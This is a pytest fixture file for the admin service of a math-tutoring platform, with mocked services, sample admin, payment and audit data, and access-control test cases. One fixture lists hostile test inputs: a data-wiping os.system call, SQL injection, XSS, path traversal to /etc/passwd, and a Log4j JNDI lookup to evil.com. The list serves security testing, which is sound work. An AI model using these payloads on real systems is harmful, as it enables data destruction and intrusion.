"""
Pytest configuration and fixtures for Admin Service tests.
"""

import asyncio
import json
from datetime import datetime, timedelta
from decimal import Decimal
from typing import Any, AsyncGenerator, Dict, Generator, List
from unittest.mock import AsyncMock, MagicMock

import pytest
import pytest_asyncio


# Test database and Redis fixtures
@pytest.fixture(scope="session")
def event_loop() -> Generator[asyncio.AbstractEventLoop, None, None]:
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()


@pytest_asyncio.fixture
async def mock_db_session() -> AsyncGenerator[AsyncMock, None]:
    """Mock database session for testing."""
    mock_session = AsyncMock()
    mock_session.commit = AsyncMock()
    mock_session.rollback = AsyncMock()
    mock_session.close = AsyncMock()
    mock_session.add = MagicMock()
    mock_session.delete = MagicMock()
    mock_session.execute = AsyncMock()
    mock_session.scalar = AsyncMock()
    mock_session.scalars = AsyncMock()
    yield mock_session


@pytest_asyncio.fixture
async def mock_redis() -> AsyncGenerator[AsyncMock, None]:
    """Mock Redis client for testing."""
    mock_redis = AsyncMock()
    mock_redis.get = AsyncMock()
    mock_redis.set = AsyncMock()
    mock_redis.delete = AsyncMock()
    mock_redis.exists = AsyncMock()
    mock_redis.expire = AsyncMock()
    mock_redis.hget = AsyncMock()
    mock_redis.hset = AsyncMock()
    mock_redis.hdel = AsyncMock()
    mock_redis.zadd = AsyncMock()
    mock_redis.zrange = AsyncMock()
    mock_redis.zrem = AsyncMock()
    mock_redis.keys = AsyncMock()
    mock_redis.flushdb = AsyncMock()
    yield mock_redis


# Admin user fixtures
@pytest.fixture
def sample_admin_data():
    """Sample admin user data for testing."""
    return {
        "username": "admin",
        "email": "admin@mathservice.com",
        "full_name": "System Administrator",
        "role": "super_admin",
        "permissions": [
            "user_management",
            "content_management",
            "payment_management",
            "system_monitoring",
            "audit_logs",
            "backup_restore",
            "security_settings",
        ],
        "is_active": True,
        "is_super_admin": True,
        "last_login": datetime.utcnow(),
        "password_hash": "hashed_admin_password",
        "two_factor_enabled": True,
        "created_at": datetime.utcnow(),
        "updated_at": datetime.utcnow(),
    }


@pytest.fixture
def sample_moderator_data():
    """Sample moderator data for testing."""
    return {
        "username": "moderator",
        "email": "moderator@mathservice.com",
        "full_name": "Content Moderator",
        "role": "moderator",
        "permissions": ["content_management", "user_moderation", "comment_management"],
        "is_active": True,
        "is_super_admin": False,
        "department": "Content",
        "created_at": datetime.utcnow(),
    }


# System monitoring fixtures
@pytest.fixture
def sample_system_metrics():
    """Sample system metrics for testing."""
    return {
        "timestamp": datetime.utcnow(),
        "cpu_usage": 45.2,  # percentage
        "memory_usage": 68.5,  # percentage
        "disk_usage": 32.1,  # percentage
        "network_in": 1024000,  # bytes
        "network_out": 2048000,  # bytes
        "active_users": 150,
        "total_requests": 5420,
        "error_rate": 0.02,  # percentage
        "response_time_avg": 245.5,  # milliseconds
        "database_connections": 25,
        "redis_memory": 128.5,  # MB
        "services_status": {
            "user_service": "healthy",
            "payment_service": "healthy",
            "math_solver_service": "healthy",
            "content_service": "healthy",
            "admin_service": "healthy",
            "frontend": "healthy",
            "database": "healthy",
            "redis": "healthy",
        },
    }


@pytest.fixture
def sample_audit_log():
    """Sample audit log entry for testing."""
    return {
        "id": 1,
        "admin_id": 1,
        "admin_username": "admin",
        "action": "user_deleted",
        "resource_type": "user",
        "resource_id": 123,
        "details": {
            "user_email": "deleted_user@example.com",
            "reason": "Violation of terms of service",
            "deleted_data": {
                "full_name": "Deleted User",
                "registration_date": "2024-01-01",
                "last_login": "2024-01-14",
            },
        },
        "ip_address": "192.168.1.100",
        "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "severity": "high",
        "status": "completed",
        "created_at": datetime.utcnow(),
    }


# User management fixtures
@pytest.fixture
def sample_user_management_data():
    """Sample user management data for testing."""
    return {
        "total_users": 1250,
        "active_users": 1180,
        "inactive_users": 70,
        "verified_users": 1100,
        "unverified_users": 150,
        "premium_users": 85,
        "banned_users": 5,
        "new_registrations_today": 12,
        "new_registrations_this_week": 78,
        "new_registrations_this_month": 320,
        "user_activity": {
            "daily_active": 450,
            "weekly_active": 890,
            "monthly_active": 1180,
        },
        "top_countries": [
            {"country": "Vietnam", "users": 850},
            {"country": "United States", "users": 120},
            {"country": "Singapore", "users": 80},
            {"country": "Thailand", "users": 65},
            {"country": "Malaysia", "users": 45},
        ],
    }


# Payment management fixtures
@pytest.fixture
def sample_payment_analytics():
    """Sample payment analytics for testing."""
    return {
        "total_revenue": Decimal("125000000"),  # VND
        "revenue_today": Decimal("850000"),
        "revenue_this_week": Decimal("5200000"),
        "revenue_this_month": Decimal("18500000"),
        "total_transactions": 2450,
        "successful_transactions": 2380,
        "failed_transactions": 70,
        "success_rate": 97.14,  # percentage
        "average_transaction_value": Decimal("51020"),
        "payment_methods": {
            "vnpay": {"count": 1200, "revenue": Decimal("65000000")},
            "momo": {"count": 850, "revenue": Decimal("42000000")},
            "zalopay": {"count": 400, "revenue": Decimal("18000000")},
        },
        "refunds": {
            "total_refunds": 15,
            "refund_amount": Decimal("750000"),
            "refund_rate": 0.61,  # percentage
        },
    }


# Content management fixtures
@pytest.fixture
def sample_content_analytics():
    """Sample content analytics for testing."""
    return {
        "total_articles": 450,
        "published_articles": 420,
        "draft_articles": 25,
        "pending_review": 5,
        "total_views": 125000,
        "total_likes": 8500,
        "total_comments": 2100,
        "top_articles": [
            {
                "id": 1,
                "title": "Giải phương trình bậc hai",
                "views": 5200,
                "likes": 340,
                "comments": 85,
            },
            {
                "id": 2,
                "title": "Tích phân cơ bản",
                "views": 4800,
                "likes": 290,
                "comments": 72,
            },
        ],
        "categories": {
            "algebra": {"articles": 120, "views": 45000},
            "calculus": {"articles": 95, "views": 38000},
            "geometry": {"articles": 80, "views": 25000},
            "statistics": {"articles": 65, "views": 17000},
        },
    }


# Security fixtures
@pytest.fixture
def sample_security_events():
    """Sample security events for testing."""
    return [
        {
            "id": 1,
            "event_type": "failed_login",
            "severity": "medium",
            "ip_address": "192.168.1.100",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "details": {"username": "admin", "attempts": 3, "blocked": False},
            "created_at": datetime.utcnow(),
        },
        {
            "id": 2,
            "event_type": "suspicious_activity",
            "severity": "high",
            "ip_address": "10.0.0.1",
            "user_agent": "curl/7.68.0",
            "details": {
                "activity": "multiple_rapid_requests",
                "request_count": 100,
                "time_window": "1 minute",
                "blocked": True,
            },
            "created_at": datetime.utcnow() - timedelta(minutes=5),
        },
        {
            "id": 3,
            "event_type": "privilege_escalation",
            "severity": "critical",
            "ip_address": "203.0.113.1",
            "user_agent": "Mozilla/5.0 (X11; Linux x86_64)",
            "details": {
                "user_id": 456,
                "attempted_action": "admin_panel_access",
                "current_role": "user",
                "blocked": True,
            },
            "created_at": datetime.utcnow() - timedelta(hours=2),
        },
    ]


# Backup fixtures
@pytest.fixture
def sample_backup_data():
    """Sample backup data for testing."""
    return {
        "backup_id": "backup_20240115_103000",
        "backup_type": "full",  # full, incremental, differential
        "status": "completed",
        "file_path": "/backups/backup_20240115_103000.sql.gz",
        "file_size": 52428800,  # bytes (50MB)
        "databases": [
            "user_service_db",
            "payment_service_db",
            "math_solver_db",
            "content_service_db",
            "admin_service_db",
        ],
        "compression": "gzip",
        "encryption": True,
        "started_at": datetime.utcnow() - timedelta(minutes=15),
        "completed_at": datetime.utcnow(),
        "duration": 900,  # seconds
        "created_by": 1,
        "retention_days": 30,
    }


# System configuration fixtures
@pytest.fixture
def sample_system_config():
    """Sample system configuration for testing."""
    return {
        "site_settings": {
            "site_name": "Math Service",
            "site_url": "https://mathservice.com",
            "admin_email": "admin@mathservice.com",
            "timezone": "Asia/Ho_Chi_Minh",
            "language": "vi",
            "maintenance_mode": False,
        },
        "security_settings": {
            "max_login_attempts": 5,
            "lockout_duration": 30,  # minutes
            "session_timeout": 60,  # minutes
            "password_min_length": 8,
            "require_2fa": True,
            "allowed_ip_ranges": ["192.168.1.0/24", "10.0.0.0/8"],
        },
        "payment_settings": {
            "default_currency": "VND",
            "min_deposit": 10000,
            "max_deposit": 50000000,
            "transaction_fee": 2.5,  # percentage
            "auto_refund_enabled": True,
        },
        "content_settings": {
            "max_file_size": 10485760,  # bytes (10MB)
            "allowed_extensions": ["jpg", "jpeg", "png", "gif", "pdf"],
            "auto_publish": False,
            "comment_moderation": True,
        },
        "notification_settings": {
            "email_notifications": True,
            "sms_notifications": False,
            "push_notifications": True,
            "admin_alerts": True,
        },
    }


# Mock external services
@pytest.fixture
def mock_monitoring_service():
    """Mock monitoring service for testing."""
    mock_service = MagicMock()
    mock_service.get_system_metrics = AsyncMock()
    mock_service.get_service_health = AsyncMock()
    mock_service.send_alert = AsyncMock()
    mock_service.create_dashboard = AsyncMock()
    return mock_service


@pytest.fixture
def mock_backup_service():
    """Mock backup service for testing."""
    mock_service = MagicMock()
    mock_service.create_backup = AsyncMock()
    mock_service.restore_backup = AsyncMock()
    mock_service.list_backups = AsyncMock()
    mock_service.delete_backup = AsyncMock()
    mock_service.verify_backup = AsyncMock()
    return mock_service


@pytest.fixture
def mock_notification_service():
    """Mock notification service for testing."""
    mock_service = MagicMock()
    mock_service.send_email = AsyncMock()
    mock_service.send_sms = AsyncMock()
    mock_service.send_push_notification = AsyncMock()
    mock_service.send_admin_alert = AsyncMock()
    return mock_service


@pytest.fixture
def mock_security_scanner():
    """Mock security scanner for testing."""
    mock_scanner = MagicMock()
    mock_scanner.scan_vulnerabilities = AsyncMock()
    mock_scanner.check_malware = AsyncMock()
    mock_scanner.analyze_logs = AsyncMock()
    mock_scanner.detect_anomalies = AsyncMock()
    return mock_scanner


# Test client fixtures
@pytest_asyncio.fixture
async def test_client():
    """Test client for API testing."""
    from admin_service.main import app
    from fastapi.testclient import TestClient

    with TestClient(app) as client:
        yield client


# Environment fixtures
@pytest.fixture(autouse=True)
def setup_test_environment(monkeypatch):
    """Setup test environment variables."""
    monkeypatch.setenv("TESTING", "true")
    monkeypatch.setenv("ADMIN_SERVICE_DB_URL", "sqlite:///:memory:")
    monkeypatch.setenv("REDIS_URL", "redis://localhost:6379/15")
    monkeypatch.setenv("JWT_SECRET_KEY", "test-secret-key")
    monkeypatch.setenv("ADMIN_JWT_SECRET_KEY", "test-admin-secret-key")
    monkeypatch.setenv("SUPER_ADMIN_EMAIL", "admin@mathservice.com")
    monkeypatch.setenv("SUPER_ADMIN_PASSWORD", "test-admin-password")
    monkeypatch.setenv("ENABLE_AUDIT_LOGGING", "true")
    monkeypatch.setenv("MAX_LOGIN_ATTEMPTS", "5")
    monkeypatch.setenv("LOCKOUT_DURATION_MINUTES", "30")
    monkeypatch.setenv("BACKUP_RETENTION_DAYS", "30")
    monkeypatch.setenv("MONITORING_INTERVAL", "60")  # seconds


# Performance testing fixtures
@pytest.fixture
def performance_threshold():
    """Performance thresholds for admin operations."""
    return {
        "dashboard_load": 2.0,  # seconds
        "user_search": 1.0,  # seconds
        "audit_log_query": 3.0,  # seconds
        "system_metrics": 1.5,  # seconds
        "backup_creation": 300.0,  # seconds (5 minutes)
        "report_generation": 10.0,  # seconds
    }


# Security testing fixtures
@pytest.fixture
def security_test_data():
    """Security test data for admin service."""
    return {
        "privilege_escalation_attempts": [
            {"action": "delete_user", "role": "moderator"},
            {"action": "system_config", "role": "user"},
            {"action": "backup_restore", "role": "moderator"},
            {"action": "audit_logs", "role": "user"},
        ],
        "malicious_inputs": [
            "__import__('os').system('rm -rf /')",
            "'; DROP TABLE users; --",
            "<script>alert('admin_xss')</script>",
            "../../../etc/passwd",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j injection
        ],
        "brute_force_patterns": [
            {"ip": "192.168.1.100", "attempts": 10, "timeframe": 60},
            {"ip": "10.0.0.1", "attempts": 50, "timeframe": 300},
            {"ip": "203.0.113.1", "attempts": 100, "timeframe": 600},
        ],
    }


# Role-based access control fixtures
@pytest.fixture
def rbac_test_cases():
    """Role-based access control test cases."""
    return {
        "super_admin": {
            "allowed_actions": [
                "user_management",
                "content_management",
                "payment_management",
                "system_monitoring",
                "audit_logs",
                "backup_restore",
                "security_settings",
                "admin_management",
            ],
            "denied_actions": [],
        },
        "admin": {
            "allowed_actions": [
                "user_management",
                "content_management",
                "payment_management",
                "system_monitoring",
                "audit_logs",
            ],
            "denied_actions": [
                "backup_restore",
                "security_settings",
                "admin_management",
            ],
        },
        "moderator": {
            "allowed_actions": [
                "content_management",
                "user_moderation",
                "comment_management",
            ],
            "denied_actions": [
                "user_management",
                "payment_management",
                "system_monitoring",
                "audit_logs",
                "backup_restore",
                "security_settings",
            ],
        },
        "user": {
            "allowed_actions": [],
            "denied_actions": [
                "user_management",
                "content_management",
                "payment_management",
                "system_monitoring",
                "audit_logs",
                "backup_restore",
                "security_settings",
                "admin_management",
            ],
        },
    }


# Database cleanup fixtures
@pytest_asyncio.fixture(autouse=True)
async def cleanup_database():
    """Clean up database after each test."""
    yield
    # Cleanup logic would go here
    # For example: truncate tables, reset sequences, etc.
